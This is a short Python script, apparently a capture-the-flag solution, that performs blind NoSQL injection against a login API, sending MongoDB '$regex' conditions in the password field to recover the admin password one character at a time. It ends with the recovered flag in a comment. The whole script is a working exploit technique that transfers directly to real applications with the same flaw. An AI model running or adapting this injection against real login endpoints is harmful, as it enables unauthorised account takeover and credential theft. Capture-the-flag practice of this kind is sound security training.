import requests

username = "admin"
password = ""
u = "http://159.65.90.8:30760/api/login"
headers = {'content-type': 'application/json'}
dict = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_{}"

while True:
    for c in dict:
        if c not in []:
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (
                username, password + c)
            r = requests.post(u, data=payload, headers=headers)
            print(password+c)
            try:
                data = r.json()
                if data['logged'] == 1:
                    print("Found one more char : %s" % (password+c))
                    password += c
                    break
            except:
                print(password+c)
# HTB{t0b3_5qL_0r_n05qL_7h4t_is_th3_Q}
